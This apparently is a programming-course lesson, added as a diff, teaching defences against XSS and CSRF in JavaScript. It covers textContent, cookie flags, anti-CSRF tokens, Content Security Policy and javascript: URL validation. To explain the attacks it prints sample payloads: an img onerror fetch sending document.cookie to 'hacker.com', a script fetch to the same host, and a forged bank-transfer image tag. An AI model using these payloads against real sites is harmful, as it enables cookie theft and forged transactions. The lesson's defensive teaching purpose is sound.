@@ -1,0 +1,103 @@
+---
+slug: "security-js"
+title: "JavaScript Security (XSS & CSRF)"
+level: 5
+---
+
+## WHY
+JavaScript is the most widely distributed execution environment in the world. When a user visits your website, they are blindly downloading and executing your code on their personal machine.
+If your JavaScript application has a vulnerability, a hacker can inject their own malicious code into your website. This malicious code executes *in the user's browser*, allowing the hacker to steal session tokens, impersonate the user, drain bank accounts, and completely hijack the application.
+Understanding XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery) is mandatory for any developer building modern web applications.
+
+## THEORY
+### XSS (Cross-Site Scripting)
+XSS occurs when a hacker successfully tricks your website into executing their malicious JavaScript. 
+If your website takes data from the database (e.g., a user's comment) and blindly renders it as HTML, a hacker can write `<script>stealTokens()</script>` as their comment. When other users view the comment, the browser executes the script!
+
+### CSRF (Cross-Site Request Forgery)
+CSRF occurs when a hacker tricks a user into executing an unwanted action on a site where they are currently authenticated.
+If a user is logged into `bank.com`, the browser automatically attaches their authentication cookies to all requests made to `bank.com`. If the hacker sends the user an email with a hidden image `<img src="http://bank.com/transfer?amount=10000&to=hacker" />`, the browser attempts to load the image, automatically attaching the auth cookies. The bank sees a fully authenticated request and executes the transfer!
+
+## VISUALIZATION_CONFIG
+```json
+{ "component": "ArchitectureVisualizer", "state": "security" }
+```
+
+## CODE
+
+### Level 1 — The DOM-based XSS Vulnerability
+The absolute most dangerous property in JavaScript is `innerHTML`. If you use it with user-supplied data, you have an XSS vulnerability.
+
+```javascript
+// BAD: A hacker sets their username to:
+// <img src="x" onerror="fetch('http://hacker.com?cookie=' + document.cookie)" />
+const usernameFromAPI = getUsername(); 
+
+// The browser sees the broken image, fires the 'onerror' event, 
+// executes the JavaScript, and steals the user's cookie!
+document.getElementById('profile').innerHTML = `<h1>Welcome ${usernameFromAPI}</h1>`;
+
+// GOOD: Use textContent!
+// The browser will NOT parse HTML tags. It will render the exact literal 
+// string "<img src..." on the screen safely.
+document.getElementById('profile').textContent = `Welcome ${usernameFromAPI}`;
+```
+*Note: Modern frameworks like React and Angular are secure by default. If you write `<h1>{username}</h1>` in React, React uses `textContent` under the hood! To bypass this in React, you have to explicitly use the terrifyingly named `dangerouslySetInnerHTML` property!*
+
+### Level 2 — Securing Cookies (Defeating XSS)
+If an XSS attack *does* happen, the hacker's first goal is to read `document.cookie` to steal the JWT or Session ID.
+You can completely defeat this by setting the **HttpOnly** flag when your backend server creates the cookie!
+
+```http
+# An HTTP Response Header sent by the server
+Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict
+```
+- `HttpOnly`: The browser physically blocks JavaScript (`document.cookie`) from ever reading the cookie. XSS scripts cannot steal it!
+- `Secure`: The cookie will only ever be sent over encrypted HTTPS connections.
+- `SameSite=Strict`: The cookie will only be sent if the request originates from the exact same domain (Defeats CSRF!).
+
+### Level 3 — Defeating CSRF (Anti-CSRF Tokens)
+If you cannot use `SameSite=Strict` cookies (perhaps your frontend and backend are on different domains), you must implement Anti-CSRF Tokens.
+1. The server generates a random, cryptographically secure token.
+2. The server sends it to the frontend (usually in a `<meta>` tag or a custom Header).
+3. Every time the frontend makes a `POST`, `PUT`, or `DELETE` request, it must manually read the token and attach it to the request header.
+
+```javascript
+// 1. Read the token the server gave us
+const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+// 2. Attach it to the HTTP Request!
+fetch('/api/transfer-money', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    // The server will reject the request if this header is missing or incorrect!
+    'X-CSRF-Token': csrfToken 
+  },
+  body: JSON.stringify({ to: 'Alice', amount: 50 })
+});
+```
+*Why this works:* A hacker on `evil.com` can trick the browser into sending the Auth Cookies, but the hacker's JavaScript *cannot read* the `meta` tag on your website to get the CSRF token! The request fails!
+
+### Level 4 — Content Security Policy (CSP)
+The ultimate defense against XSS is a Content Security Policy. This is an HTTP Header sent by your server that instructs the browser exactly *which* scripts are allowed to run, and *where* they are allowed to communicate.
+
+```http
+# The server sends this header:
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-analytics.com;
+```
+If a hacker successfully injects `<script>fetch('http://hacker.com')</script>` via XSS, the browser will look at the CSP header. It will see that scripts are only allowed to communicate with `'self'` (your domain) and `trusted-analytics.com`. The browser will **immediately kill the script**, block the network request to `hacker.com`, and log a massive security violation in the console!
+
+## REAL_WORLD
+**Third-Party Dependencies (Supply Chain Attacks)**
+You write perfectly secure code. But you run `npm install left-pad`.
+What if a hacker compromised the developer of the `left-pad` package, and pushed a malicious update?
+When you bundle your app, the hacker's JavaScript is now compiled directly into your application! Because the code is technically "yours" and served from your domain, your CSP header won't block it.
+This is called a **Supply Chain Attack**, and it is the most terrifying vulnerability in modern JavaScript. To mitigate this, enterprise teams use tools like `npm audit`, Snyk, and strict package lockfiles to aggressively scan and lock down third-party dependencies.
+
+## INTERVIEW
+**Q: You use React to render a link: `<a href={userInput}>Click Here</a>`. A hacker sets their `userInput` to `javascript:alert('XSS!')`. When the user clicks the link, the browser executes the JavaScript! Since React safely escapes HTML tags, why did this XSS attack succeed, and how do you prevent it?**
+A: **The `javascript:` Pseudo-Protocol.**
+React (and other frameworks) perfectly escape HTML tags to prevent standard injection. However, React does *not* validate the contents of URL attributes (like `href` or `src`).
+If an `href` begins with `javascript:`, the browser treats the string as executable code instead of a URL path. When clicked, it runs in the context of your application!
+*The Fix:* You must manually validate and sanitize user-provided URLs before rendering them. You must ensure the URL begins with a safe protocol (`http://`, `https://`, or `mailto:`). If it doesn't, you must discard it or replace it with a safe fallback (like `#`)!
